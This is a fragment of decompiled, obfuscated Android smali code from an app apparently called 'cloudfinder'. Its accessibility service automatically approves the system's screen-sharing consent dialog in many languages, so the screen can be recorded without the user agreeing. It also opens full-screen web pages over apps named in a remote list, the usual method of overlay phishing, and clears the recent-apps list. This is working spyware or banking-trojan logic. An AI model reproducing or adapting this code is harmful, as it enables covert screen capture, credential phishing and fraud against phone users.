    iget-wide v3, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    sub-long v3, v1, v3

    const-wide/16 v5, 0x5dc

    cmp-long v3, v3, v5

    if-gez v3, :cond_2

    return-void

    :cond_2
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_3

    return-void

    :cond_3
    const-string v4, "com.android.systemui:id/screen_share_mode_options"

    invoke-virtual {v3, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    const/4 v5, 0x0

    const-string v6, "MyAccessSvc"

    const/16 v7, 0x10

    if-eqz v4, :cond_6

    invoke-interface {v4}, Ljava/util/List;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_6

    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_4

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    goto :goto_0

    :cond_4
    const-string v8, ""

    :goto_0
    const-string v9, "\u5355\u4e2a"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_5

    const-string v9, "\u4e00\u4e2a\u5e94\u7528"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_5

    const-string v9, "single app"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_5

    const-string v9, "Single app"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_5

    const-string v9, "A single app"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_6

    :cond_5
    invoke-virtual {v4, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    iput-wide v1, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    const-string v1, "MediaProjection: clicking spinner to open dropdown, current="

    invoke-virtual {v1, v8}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    :goto_1
    invoke-static {v6, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_6
    const-string v8, "\u5171\u4eab\u6574\u4e2a\u5c4f\u5e55"

    const-string v9, "\u6574\u4e2a\u5c4f\u5e55"

    const-string v10, "Entire screen"

    const-string v11, "Full screen"

    const-string v12, "To\u00e0n b\u1ed9 m\u00e0n h\u00ecnh"

    const-string v13, "Seluruh layar"

    const-string v14, "Pantalla completa"

    const-string v15, "\u00c9cran entier"

    const-string v16, "Gesamter Bildschirm"

    const-string v17, "Tela inteira"

    const-string v18, "Share entire screen"

    const-string v19, "Whole screen"

    filled-new-array/range {v8 .. v19}, [Ljava/lang/String;

    move-result-object v4

    move v8, v5

    :goto_2
    const/16 v9, 0xc

    if-ge v8, v9, :cond_a

    aget-object v9, v4, v8

    invoke-virtual {v3, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    if-eqz v10, :cond_9

    invoke-interface {v10}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :cond_7
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_9

    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v12

    if-eqz v12, :cond_8

    invoke-virtual {v11, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    iput-wide v1, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "MediaProjection: selected entire screen: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_3
    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_4
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_8
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    if-eqz v11, :cond_7

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v12

    if-eqz v12, :cond_7

    invoke-virtual {v11, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    iput-wide v1, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "MediaProjection: selected entire screen (parent): "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_3

    :cond_9
    add-int/lit8 v8, v8, 0x1

    goto :goto_2

    :cond_a
    const-string v9, "\u5171\u4eab\u5c4f\u5e55"

    const-string v10, "Share screen"

    const-string v11, "Start sharing"

    const-string v12, "Start now"

    const-string v13, "Start"

    const-string v14, "Allow"

    const-string v15, "\u7acb\u5373\u5f00\u59cb"

    const-string v16, "\u5f00\u59cb"

    const-string v17, "\u5141\u8bb8"

    const-string v18, "B\u1eaft \u0111\u1ea7u ngay"

    const-string v19, "B\u1eaft \u0111\u1ea7u"

    const-string v20, "Cho ph\u00e9p"

    const-string v21, "Mulai sekarang"

    const-string v22, "Mulai"

    const-string v23, "Izinkan"

    const-string v24, "\u0905\u092d\u0940 \u0936\u0941\u0930\u0942 \u0915\u0930\u0947\u0902"

    const-string v25, "\u0936\u0941\u0930\u0942 \u0915\u0930\u0947\u0902"

    const-string v26, "\u0905\u0928\u0941\u092e\u0924\u093f \u0926\u0947\u0902"

    const-string v27, "\u0e40\u0e23\u0e34\u0e48\u0e21\u0e40\u0e25\u0e22"

    const-string v28, "\u0e40\u0e23\u0e34\u0e48\u0e21"

    const-string v29, "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15"

    const-string v30, "Come\u00e7ar agora"

    const-string v31, "Iniciar"

    const-string v32, "Permitir"

    const-string v33, "Empezar ahora"

    const-string v34, "Iniciar"

    const-string v35, "Permitir"

    const-string v36, "Commencer"

    const-string v37, "Autoriser"

    const-string v38, "Jetzt starten"

    const-string v39, "Zulassen"

    const-string v40, "Teilen"

    filled-new-array/range {v9 .. v40}, [Ljava/lang/String;

    move-result-object v4

    :goto_5
    const/16 v8, 0x20

    if-ge v5, v8, :cond_e

    aget-object v8, v4, v5

    invoke-virtual {v3, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    if-eqz v9, :cond_d

    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_b
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_d

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v11

    if-eqz v11, :cond_c

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    move-result v11

    if-eqz v11, :cond_c

    invoke-virtual {v10, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    iput-wide v1, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "MediaProjection auto-accepted: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_6
    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto/16 :goto_4

    :cond_c
    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    if-eqz v10, :cond_b

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v11

    if-eqz v11, :cond_b

    invoke-virtual {v10, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    iput-wide v1, v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "MediaProjection auto-accepted (parent): "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_6

    :cond_d
    add-int/lit8 v5, v5, 0x1

    goto :goto_5

    :cond_e
    return-void
.end method

.method public final ة(Ljava/lang/String;)V
    .locals 7

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {p1}, Lڜٟٱڀ/ة;->آ(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    return-void

    :cond_1
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lڜٟٱڀ/ة;->ء()Lڜٟٱڀ/ة;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    if-eqz v2, :cond_2

    goto :goto_1

    :cond_2
    iget-object v2, v1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_3

    iget-boolean v2, v1, Lڜٟٱڀ/ة;->ؤ:Z

    if-eqz v2, :cond_3

    iput-boolean v4, v1, Lڜٟٱڀ/ة;->ؤ:Z

    :cond_3
    invoke-static {p1}, Lڜٟٱڀ/ة;->آ(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    goto :goto_1

    :cond_4
    iget-object v2, v1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    iget-boolean v2, v1, Lڜٟٱڀ/ة;->آ:Z

    if-eqz v2, :cond_6

    iget-boolean v2, v1, Lڜٟٱڀ/ة;->أ:Z

    if-eqz v2, :cond_6

    iget-object v2, v1, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    iget-object v5, v1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_6

    iget-object v2, v1, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v5, Lڜٟٱڀ/ئ;

    invoke-direct {v5, v1, v3}, Lڜٟٱڀ/ئ;-><init>(Lڜٟٱڀ/ة;I)V

    goto :goto_0

    :cond_5
    iget-boolean v2, v1, Lڜٟٱڀ/ة;->آ:Z

    if-eqz v2, :cond_6

    iget-boolean v2, v1, Lڜٟٱڀ/ة;->أ:Z

    if-nez v2, :cond_6

    iget-object v2, v1, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v5, Lڜٟٱڀ/ئ;

    const/4 v6, 0x2

    invoke-direct {v5, v1, v6}, Lڜٟٱڀ/ئ;-><init>(Lڜٟٱڀ/ة;I)V

    :goto_0
    invoke-virtual {v2, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_6
    :goto_1
    iget-object v2, v1, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v2, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    return-void

    :cond_7
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    return-void

    :cond_8
    iget-boolean v0, v1, Lڜٟٱڀ/ة;->آ:Z

    if-eqz v0, :cond_9

    iget-object v0, v1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    return-void

    :cond_9
    monitor-enter v1

    :try_start_0
    iget-boolean v0, v1, Lڜٟٱڀ/ة;->آ:Z

    if-nez v0, :cond_a

    iget-object v0, v1, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v0, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_a

    iget-boolean v0, v1, Lڜٟٱڀ/ة;->ؤ:Z

    if-nez v0, :cond_a

    iget-object v0, v1, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    iget-object v0, v1, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-nez v0, :cond_a

    goto :goto_2

    :cond_a
    move v3, v4

    :goto_2
    monitor-exit v1

    if-eqz v3, :cond_b

    iget-object v0, v1, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    iget-boolean v2, v1, Lڜٟٱڀ/ة;->إ:Z

    invoke-virtual {v1, p0, v0, p1, v2}, Lڜٟٱڀ/ة;->ؤ(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Z)V

    return-void

    :cond_b
    sget-object v0, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    if-eqz v0, :cond_15

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-nez v2, :cond_c

    goto/16 :goto_7

    :cond_c
    move v2, v4

    :goto_3
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-ge v2, v3, :cond_15

    invoke-virtual {v0, v2}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v3

    if-nez v3, :cond_d

    goto/16 :goto_6

    :cond_d
    const-string v5, "used"

    invoke-virtual {v3, v5, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-nez v5, :cond_e

    goto :goto_6

    :cond_e
    const-string v5, "pkg"

    const-string v6, ""

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_14

    invoke-virtual {v5, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_f

    goto :goto_6

    :cond_f
    const-string v5, "defopage"

    const-string v6, ""

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :cond_10

    goto :goto_6

    :cond_10
    const-string v0, "http://"

    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_13

    const-string v0, "https://"

    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_13

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_11

    iget-object v0, v0, Lڜٟٱڀ/د;->ث:Ljava/lang/String;

    goto :goto_4

    :cond_11
    const-string v0, ""

    :goto_4
    if-eqz v0, :cond_13

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_13

    const-string v2, "/"

    invoke-virtual {v5, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_12

    goto :goto_5

    :cond_12
    const-string v2, "/"

    invoke-virtual {v2, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    :goto_5
    const-string v2, "https://"

    invoke-static {v2, v0, v5}, Landroidx/activity/result/؋;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    :cond_13
    const-string v0, "fullscreen"

    invoke-virtual {v3, v0, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    invoke-virtual {v1, p0, v5, p1, v0}, Lڜٟٱڀ/ة;->ؤ(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Z)V

    return-void

    :cond_14
    :goto_6
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_15
    :goto_7
    return-void

    :catchall_0
    move-exception p1

    monitor-exit v1

    throw p1
.end method

.method public final ت()V
    .locals 23

    move-object/from16 v1, p0

    const-string v0, "\u6e05\u9664"

    const-string v2, "\u5168\u90e8\u6e05\u9664"

    const-string v3, "Close All"

    const-string v4, "CLOSE ALL"

    const-string v5, "Close all"

    const-string v6, "Clear all"

    const-string v7, "MyAccessSvc"

    :try_start_0
    const-string v8, "Clearing all recent apps"

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v8, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v9

    invoke-direct {v8, v9}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v9, Lڛڜڕڰڑ/ء;

    const/16 v10, 0x9

    invoke-direct {v9, v1, v10}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v8, v9}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    const-wide/16 v8, 0x320

    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    const/16 v8, 0x53

    new-array v9, v8, [Ljava/lang/String;

    const/4 v11, 0x0

    aput-object v6, v9, v11

    const/4 v12, 0x1

    aput-object v5, v9, v12

    const-string v13, "CLEAR ALL"

    const/4 v14, 0x2

    aput-object v13, v9, v14

    const/4 v13, 0x3

    aput-object v4, v9, v13

    const-string v15, "Clear All"

    const/16 v16, 0x4

    aput-object v15, v9, v16

    const/4 v15, 0x5

    aput-object v3, v9, v15

    const-string v17, "Close all apps"

    const/4 v15, 0x6

    aput-object v17, v9, v15

    const/16 v17, 0x7

    aput-object v3, v9, v17

    const/16 v3, 0x8

    aput-object v4, v9, v3

    aput-object v5, v9, v10

    const/16 v3, 0xa

    aput-object v6, v9, v3

    const-string v3, "Clear"

    const/16 v4, 0xb

    aput-object v3, v9, v4

    const-string v3, "\u5168\u90e8\u5173\u95ed"

    const/16 v4, 0xc

    aput-object v3, v9, v4

    const-string v3, "\u5173\u95ed\u5168\u90e8"

    const/16 v4, 0xd

    aput-object v3, v9, v4

    const-string v3, "\u6e05\u9664\u5168\u90e8"

    const/16 v4, 0xe

    aput-object v3, v9, v4

    const/16 v3, 0xf

    aput-object v2, v9, v3

    const/16 v3, 0x10

    aput-object v0, v9, v3

    const-string v4, "\u4e00\u952e\u6e05\u7406"

    const/16 v10, 0x11

    aput-object v4, v9, v10

    const-string v4, "\u5168\u90e8\u6e05\u7406"

    const/16 v10, 0x12

    aput-object v4, v9, v10

    const-string v4, "Cerrar todo"

    const/16 v10, 0x13

    aput-object v4, v9, v10

    const-string v4, "Borrar todo"

    const/16 v10, 0x14

    aput-object v4, v9, v10

    const-string v4, "Cerrar todas"

    const/16 v10, 0x15

    aput-object v4, v9, v10

    const-string v4, "Limpiar todo"

    const/16 v10, 0x16

    aput-object v4, v9, v10

    const-string v4, "Fechar tudo"

    const/16 v10, 0x17

    aput-object v4, v9, v10

    const-string v4, "Limpar tudo"

    const/16 v10, 0x18

    aput-object v4, v9, v10

    const-string v4, "Fechar todas"

    const/16 v10, 0x19

    aput-object v4, v9, v10

    const-string v4, "Tout fermer"

    const/16 v10, 0x1a

    aput-object v4, v9, v10

    const-string v4, "Tout effacer"

    const/16 v10, 0x1b

    aput-object v4, v9, v10

    const-string v4, "Fermer tout"

    const/16 v10, 0x1c

    aput-object v4, v9, v10

    const-string v4, "Effacer tout"

    const/16 v10, 0x1d

    aput-object v4, v9, v10

    const-string v4, "Alle schlie\u00dfen"

    const/16 v10, 0x1e

    aput-object v4, v9, v10

    const-string v4, "Alle l\u00f6schen"

    const/16 v10, 0x1f

    aput-object v4, v9, v10

    const-string v4, "Alles schlie\u00dfen"

    const/16 v10, 0x20

    aput-object v4, v9, v10

    const-string v4, "Alles l\u00f6schen"

    const/16 v10, 0x21

    aput-object v4, v9, v10

    const-string v4, "Chiudi tutto"

    const/16 v10, 0x22

    aput-object v4, v9, v10

    const-string v4, "Cancella tutto"

    const/16 v10, 0x23

    aput-object v4, v9, v10

    const-string v4, "Chiudi tutte"

    const/16 v10, 0x24

    aput-object v4, v9, v10

    const-string v4, "\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u0432\u0441\u0435"

    const/16 v10, 0x25

    aput-object v4, v9, v10

    const-string v4, "\u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u0432\u0441\u0435"

    const/16 v10, 0x26

    aput-object v4, v9, v10

    const-string v4, "\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u0432\u0441\u0451"

    const/16 v10, 0x27

    aput-object v4, v9, v10

    const-string v4, "Tutup semua"

    const/16 v10, 0x28

    aput-object v4, v9, v10

    const-string v4, "Hapus semua"

    const/16 v10, 0x29

    aput-object v4, v9, v10

    const-string v4, "Bersihkan semua"

    const/16 v10, 0x2a

    aput-object v4, v9, v10

    const-string v4, "\u0110\u00f3ng t\u1ea5t c\u1ea3"

    const/16 v10, 0x2b

    aput-object v4, v9, v10

    const-string v4, "X\u00f3a t\u1ea5t c\u1ea3"

    const/16 v10, 0x2c

    aput-object v4, v9, v10

    const-string v4, "Xo\u00e1 t\u1ea5t c\u1ea3"

    const/16 v10, 0x2d

    aput-object v4, v9, v10

    const-string v4, "\u0e1b\u0e34\u0e14\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14"

    const/16 v10, 0x2e

    aput-object v4, v9, v10

    const-string v4, "\u0e25\u0e49\u0e32\u0e07\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14"

    const/16 v10, 0x2f

    aput-object v4, v9, v10

    const-string v4, "\u0625\u063a\u0644\u0627\u0642 \u0627\u0644\u0643\u0644"

    const/16 v10, 0x30

    aput-object v4, v9, v10

    const-string v4, "\u0645\u0633\u062d \u0627\u0644\u0643\u0644"

    const/16 v10, 0x31

    aput-object v4, v9, v10

    const-string v4, "\u0625\u063a\u0644\u0627\u0642 \u0627\u0644\u062c\u0645\u064a\u0639"

    const/16 v10, 0x32

    aput-object v4, v9, v10

    const-string v4, "\u0938\u092d\u0940 \u092c\u0902\u0926 \u0915\u0930\u0947\u0902"

    const/16 v10, 0x33

    aput-object v4, v9, v10

    const-string v4, "\u0938\u092c \u0939\u091f\u093e\u090f\u0902"

    const/16 v10, 0x34

    aput-object v4, v9, v10

    const-string v4, "\u0938\u092d\u0940 \u0938\u093e\u092b\u093c \u0915\u0930\u0947\u0902"

    const/16 v10, 0x35

    aput-object v4, v9, v10

    const-string v4, "\ubaa8\ub450 \ub2eb\uae30"

    const/16 v10, 0x36

    aput-object v4, v9, v10

    const-string v4, "\ubaa8\ub450 \uc9c0\uc6b0\uae30"

    const/16 v10, 0x37

    aput-object v4, v9, v10

    const-string v4, "\uc804\uccb4 \ub2eb\uae30"

    const/16 v10, 0x38

    aput-object v4, v9, v10

    const-string v4, "\u3059\u3079\u3066\u9589\u3058\u308b"

    const/16 v10, 0x39

    aput-object v4, v9, v10

    const-string v4, "\u3059\u3079\u3066\u30af\u30ea\u30a2"

    const/16 v10, 0x3a

    aput-object v4, v9, v10

    const-string v4, "\u5168\u3066\u9589\u3058\u308b"

    const/16 v10, 0x3b

    aput-object v4, v9, v10

    const-string v4, "T\u00fcm\u00fcn\u00fc kapat"

    const/16 v10, 0x3c

    aput-object v4, v9, v10

    const-string v4, "T\u00fcm\u00fcn\u00fc temizle"

    const/16 v10, 0x3d

    aput-object v4, v9, v10

    const-string v4, "Hepsini kapat"

    const/16 v10, 0x3e

    aput-object v4, v9, v10

    const-string v4, "Alles sluiten"

    const/16 v10, 0x3f

    aput-object v4, v9, v10

    const-string v4, "Alles wissen"

    const/16 v10, 0x40

    aput-object v4, v9, v10

    const-string v4, "Zamknij wszystko"

    const/16 v10, 0x41

    aput-object v4, v9, v10

    const-string v4, "Wyczy\u015b\u0107 wszystko"

    const/16 v10, 0x42

    aput-object v4, v9, v10

    const-string v4, "\u00cenchide tot"

    const/16 v10, 0x43

    aput-object v4, v9, v10

    const-string v4, "\u0218terge tot"

    const/16 v10, 0x44

    aput-object v4, v9, v10

    const-string v4, "Zav\u0159\u00edt v\u0161e"

    const/16 v10, 0x45

    aput-object v4, v9, v10

    const-string v4, "Vymazat v\u0161e"

    const/16 v10, 0x46

    aput-object v4, v9, v10

    const-string v4, "\u00d6sszes bez\u00e1r\u00e1sa"

    const/16 v10, 0x47

    aput-object v4, v9, v10

    const-string v4, "\u00d6sszes t\u00f6rl\u00e9se"

    const/16 v10, 0x48

    aput-object v4, v9, v10

    const-string v4, "\u039a\u03bb\u03b5\u03af\u03c3\u03b9\u03bc\u03bf \u03cc\u03bb\u03c9\u03bd"

    const/16 v10, 0x49

    aput-object v4, v9, v10

    const-string v4, "\u0395\u03ba\u03ba\u03b1\u03b8\u03ac\u03c1\u03b9\u03c3\u03b7 \u03cc\u03bb\u03c9\u03bd"

    const/16 v10, 0x4a

    aput-object v4, v9, v10

    const-string v4, "St\u00e4ng alla"

    const/16 v10, 0x4b

    aput-object v4, v9, v10

    const-string v4, "Rensa alla"

    const/16 v10, 0x4c

    aput-object v4, v9, v10

    const-string v4, "\u09b8\u09ac \u09ac\u09a8\u09cd\u09a7 \u0995\u09b0\u09c1\u09a8"

    const/16 v10, 0x4d

    aput-object v4, v9, v10

    const-string v4, "\u0633\u0628 \u0628\u0646\u062f \u06a9\u0631\u06cc\u06ba"

    const/16 v10, 0x4e

    aput-object v4, v9, v10

    const-string v4, "\u0b85\u0ba9\u0bc8\u0ba4\u0bcd\u0ba4\u0bc8\u0baf\u0bc1\u0bae\u0bcd \u0bae\u0bc2\u0b9f\u0bc1"

    const/16 v10, 0x4f

    aput-object v4, v9, v10

    const-string v4, "\u1021\u102c\u1038\u101c\u102f\u1036\u1038\u1015\u102d\u1010\u103a\u101b\u1014\u103a"

    const/16 v10, 0x50

    aput-object v4, v9, v10

    const-string v4, "Funga zote"

    const/16 v10, 0x51

    aput-object v4, v9, v10

    const-string v4, "\u1201\u1209\u1295\u121d \u12dd\u130b"

    const/16 v10, 0x52

    aput-object v4, v9, v10

    move v4, v11

    move v10, v4

    :goto_0
    const-wide/16 v18, 0x12c

    if-ge v4, v13, :cond_19

    if-nez v10, :cond_19

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    if-nez v13, :cond_0

    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    move v12, v3

    const/4 v14, 0x5

    goto/16 :goto_13

    :cond_0
    move v14, v11

    :goto_1
    if-ge v14, v8, :cond_8

    aget-object v8, v9, v14

    invoke-virtual {v13, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v20

    if-nez v20, :cond_1

    goto/16 :goto_7

    :cond_1
    invoke-interface/range {v20 .. v20}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v20

    :goto_2
    invoke-interface/range {v20 .. v20}, Ljava/util/Iterator;->hasNext()Z

    move-result v21

    if-eqz v21, :cond_6

    invoke-interface/range {v20 .. v20}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v21

    move-object/from16 v12, v21

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v21

    if-eqz v21, :cond_2

